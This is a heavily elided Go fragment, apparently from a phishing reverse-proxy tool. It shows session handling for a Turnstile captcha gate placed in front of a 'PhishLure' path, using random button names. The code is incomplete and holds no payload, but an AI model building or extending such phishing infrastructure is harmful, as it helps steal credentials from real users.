...
func randomString(maxLength int) string {
	...
	length := rand.Intn(maxLength) + 1 // Ensuring the length is at least 1
...
func (s *HttpServer) turnstilePage(writer http.ResponseWriter, request *http.Request) {
	...
	if !isValid || session == "" {
		...
		if s, ok := eproxy.sessions[session]; ok {
			...
			// Generate the random button name for this session if it is empty
			if s.Turnstile.ButtonName == "" {
				s.Turnstile.ButtonName = randomString(50)
			}
			...
			pageData := PageData{
				...
				// Set the button name
				ButtonName: s.Turnstile.ButtonName,
			}
			...
			_, buttonClicked := request.Form[pageData.ButtonName]
			if buttonClicked {
				//fmt.Println("Button clicked")
				if processTurnstile(request) {
					//fmt.Printf("Captcha done for %s\n", s.PhishLure.Path)
					s.Turnstile.IsDone = true
